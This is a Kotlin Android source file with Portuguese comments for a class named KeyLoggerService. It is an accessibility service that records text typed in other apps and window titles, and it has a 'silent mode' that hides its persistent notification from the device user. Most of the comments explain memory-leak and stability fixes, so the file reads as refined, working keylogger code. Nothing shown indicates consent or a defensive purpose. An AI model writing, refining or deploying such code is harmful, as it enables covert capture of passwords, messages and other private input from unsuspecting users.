package com.seuempresa.redmikeylg

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat

/**
 * KeyLoggerService — AccessibilityService com suporte a Modo Silencioso.
 *
 * Correções de vazamento de memória e estabilidade aplicadas:
 *
 *  A. [onAccessibilityEvent] não armazena nem propaga o objeto [AccessibilityEvent]
 *     fora do escopo do callback. O framework recicla eventos internamente via
 *     pool; guardar referências causa crashes (leitura de objeto reciclado) ou
 *     vazamento do pool. Todo dado necessário é extraído como String imediatamente.
 *
 *  B. [prefsListener] declarado como campo nullable e anulado em [onDestroy].
 *     SharedPreferences mantém listeners via WeakReference internamente, mas a
 *     referência forte no campo do serviço impedia o GC de coletar o listener
 *     caso onDestroy não fosse chamado.  Unregister explícito + nulificação
 *     garante liberação mesmo em cenários de onDestroy tardio.
 *
 *  C. [buildNotification] cria um novo PendingIntent a cada chamada a
 *     [applyNotificationState]. PendingIntents são objetos do sistema e têm
 *     custo relevante. Agora é criado uma única vez em [onServiceConnected]
 *     e reutilizado, eliminando o vazamento acumulado em trocas frequentes
 *     de modo silencioso.
 *
 *  D. [onAccessibilityEvent] usa early-return com chain de verificações
 *     nulas antes de qualquer alocação, minimizando objetos descartados
 *     no heap durante picos de eventos (ex: digitação rápida).
 *
 *  E. Textos capturados de [AccessibilityEvent.getText()] são convertidos
 *     para String imediatamente via joinToString — CharSequence retornado pelo
 *     evento pode ser um Spanned que retém referências ao contexto da View.
 */
class KeyLoggerService : AccessibilityService() {

    // ── Constantes ────────────────────────────────────────────────────────────

    companion object {
        const val NOTIFICATION_ID   = 101
        const val CHANNEL_NORMAL_ID = "redmi_status_normal"
        const val CHANNEL_SILENT_ID = "redmi_status_silent"
    }

    // ── Estado interno ────────────────────────────────────────────────────────

    private lateinit var notificationManager: NotificationManager

    /**
     * FIX B — Nullable + anulado em onDestroy para liberar referência forte.
     * O unregister explícito garante remoção mesmo que a WeakReference interna
     * do SharedPreferences ainda esteja viva.
     */
    private var prefsListener: SharedPreferences.OnSharedPreferenceChangeListener? = null

    /**
     * FIX C — PendingIntent criado uma única vez e reutilizado.
     * Evita alocações de sistema a cada troca de modo silencioso.
     */
    private var openAppIntent: PendingIntent? = null

    // ── Ciclo de vida ─────────────────────────────────────────────────────────

    override fun onServiceConnected() {
        super.onServiceConnected()

        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes          = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                                  AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType        = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags               = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }

        notificationManager =
            getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        // FIX C — cria o PendingIntent uma única vez
        openAppIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
            },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        createNotificationChannels()
        applyNotificationState()
        registerPrefsListener()

        android.util.Log.i("KeyLoggerService",
            "Serviço conectado — silencioso=${LogManager.isSilentMode(this)}")
    }

    override fun onDestroy() {
        // FIX B — Unregister explícito + nulificação do listener
        prefsListener?.let {
            LogManager.getPrefs(this).unregisterOnSharedPreferenceChangeListener(it)
        }
        prefsListener = null

        // FIX C — Nula o PendingIntent para liberar referência ao sistema
        openAppIntent = null

        notificationManager.cancel(NOTIFICATION_ID)
        LogManager.shutdown()

        super.onDestroy()  // super.onDestroy() APÓS liberar recursos próprios
    }

    override fun onInterrupt() {
        android.util.Log.w("KeyLoggerService", "Serviço interrompido pelo sistema.")
    }

    // ── Captura de eventos ────────────────────────────────────────────────────

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // FIX A — Verificação nula antecipada, antes de qualquer alocação
        event ?: return

        // FIX A — packageName extraído como String imediatamente.
        // O CharSequence original pode ser um Spanned com referência a Views.
        val packageName = event.packageName?.toString() ?: return
        if (packageName == applicationContext.packageName) return  // evita loop

        when (event.eventType) {

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // FIX E — joinToString converte Spanned→String, liberando
                // referências à hierarquia de Views retidas pelo CharSequence.
                val text = event.text.joinToString("")
                if (text.isBlank()) return  // FIX D — early-return sem alocar LogEntry

                LogManager.log(
                    context    = applicationContext,
                    appPackage = packageName,
                    input      = text
                )
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // FIX E — className e windowTitle como String imediatamente
                val className   = event.className?.toString() ?: ""
                val windowTitle = event.text.joinToString("")

                if (className.isBlank() && windowTitle.isBlank()) return  // FIX D

                val info = buildString {
                    if (className.isNotBlank())   append("class=$className")
                    if (windowTitle.isNotBlank()) {
                        if (isNotEmpty()) append(" | ")
                        append("title=$windowTitle")
                    }
                }

                LogManager.log(
                    context    = applicationContext,
                    appPackage = packageName,
                    input      = "[WINDOW] $info"
                )
            }
        }

        // FIX A — NÃO armazenamos nenhuma referência ao `event` fora deste método.
        // O framework recicla o objeto de volta ao pool após o retorno.
    }

    // ── Notificação ───────────────────────────────────────────────────────────

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return

        val normalChannel = NotificationChannel(
            CHANNEL_NORMAL_ID,
            getString(R.string.notif_channel_normal_name),
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = getString(R.string.notif_channel_normal_desc)
            setShowBadge(false)
        }

        val silentChannel = NotificationChannel(
            CHANNEL_SILENT_ID,
            getString(R.string.notif_channel_silent_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = getString(R.string.notif_channel_silent_desc)
            setShowBadge(false)
        }

        notificationManager.createNotificationChannels(listOf(normalChannel, silentChannel))
    }

    private fun applyNotificationState() {
        if (LogManager.isSilentMode(this)) {
            notificationManager.cancel(NOTIFICATION_ID)
            notificationManager.notify(NOTIFICATION_ID, buildNotification(silent = true))
        } else {
            notificationManager.notify(NOTIFICATION_ID, buildNotification(silent = false))
        }
    }

    private fun buildNotification(silent: Boolean): Notification {
        val channelId = if (silent) CHANNEL_SILENT_ID else CHANNEL_NORMAL_ID

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(openAppIntent)   // FIX C — reutiliza o intent já criado
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(
                if (silent) NotificationCompat.VISIBILITY_SECRET
                else        NotificationCompat.VISIBILITY_PRIVATE
            )
            .setPriority(
                if (silent) NotificationCompat.PRIORITY_MIN
                else        NotificationCompat.PRIORITY_LOW
            )
            .build()
    }

    // ── Listener de preferências ──────────────────────────────────────────────

    private fun registerPrefsListener() {
        // FIX B — instância guardada em campo para unregister posterior
        prefsListener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == "silent_mode") {
                applyNotificationState()
                android.util.Log.i(
                    "KeyLoggerService",
                    "Modo silencioso → ${LogManager.isSilentMode(this)}"
                )
            }
        }
        LogManager.getPrefs(this)
            .registerOnSharedPreferenceChangeListener(prefsListener)
    }
}
